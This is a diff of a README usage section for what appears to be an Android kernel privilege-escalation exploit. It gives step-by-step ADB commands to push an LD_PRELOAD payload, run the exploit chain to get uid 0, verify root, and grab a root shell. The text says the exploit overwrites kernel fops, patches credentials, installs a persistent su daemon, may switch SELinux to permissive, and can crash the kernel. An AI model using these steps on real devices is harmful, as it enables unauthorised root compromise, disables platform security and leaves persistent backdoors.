@@ -112,27 +112,82 @@ wallpaper) into the `.so` via the `.S` blobs.
 
 ---
 
-## 5. Usage
+## 5. Usage (ADB)
+
+### 5.1 Push the payload
 
 ```bash
+# binary only (works from a release asset or a local build)
+adb push preload.so /data/local/tmp/preload.so
+
+# or with the repo layout
 adb push exploit/preload.so /data/local/tmp/preload.so
+adb shell chmod 755 /data/local/tmp/preload.so
+```
+
+### 5.2 Run
+
+The `.so` is loaded into the `sh` process via `LD_PRELOAD`; its constructor
+runs the whole exploit chain and reports the result:
+
+```bash
 adb shell LD_PRELOAD=/data/local/tmp/preload.so id
 ```
 
-On success the shell reports `uid=0(root)`. A `su` daemon is installed to
-`/apex/com.android.virt/bin/su` (falling back to `/data/local/tmp/su`) and an
-embedded wallpaper is applied as a persistence/verification artifact.
+On success the shell reports:
 
-### Forced real-time disk logging
+```
+uid=0(root) gid=0(root) ...
+[+] ROOT OK pid=<pid> uid=0
+```
+
+The current process (and its children) is now root. A `su` daemon is
+installed to `/apex/com.android.virt/bin/su` (falling back to
+`/data/local/tmp/su`) and an embedded wallpaper is applied as a
+persistence/verification artifact.
+
+### 5.3 Verify
+
+```bash
+# from a new shell after the run
+adb shell su -c 'id'
+
+# or grab a root shell session (interactive su client)
+adb shell /data/local/tmp/su
+
+# check SELinux was toggled permissive (if the selinux path was hit)
+adb shell getenforce
+```
+
+### 5.4 Forced real-time disk logging
 
 All `pr_*` diagnostics are also written to
 **`/sdcard/Download/log_<timestamp>.txt`** (falling back to
 `/data/local/tmp/log_<timestamp>.txt`), with `O_SYNC` + `fsync()` on every
-line so logs survive a kernel panic / reboot — pull them with:
+line so logs survive a kernel panic / reboot:
 
 ```bash
 adb pull /sdcard/Download/log_*.txt
+# or if /sdcard is not mounted early
+adb pull /data/local/tmp/log_*.txt
+adb shell cat /sdcard/Download/log_*.txt
 ```
+
+The log shows every stage (KASLR slide, fops overwrite, pipe physrw, cred
+patch) and the final `uid_after` / `ROOT OK` line — attach it when reporting
+an issue.
+
+### 5.5 Cleanup
+
+```bash
+adb shell rm -f /data/local/tmp/preload.so /data/local/tmp/log_*.txt
+adb shell rm -f /data/local/tmp/su /data/local/tmp/temp_su.sock /data/local/tmp/su_daemon.log
+adb reboot   # if SELinux/cred state or the wallpaper was modified
+```
+
+> **Note:** running the exploit may crash the kernel. If `adb` drops, wait for
+> the device to reboot, then pull `/sdcard/Download/log_*.txt` — the forced
+> `O_SYNC`/`fsync` logging is exactly what survives the panic.
 
 ---
 
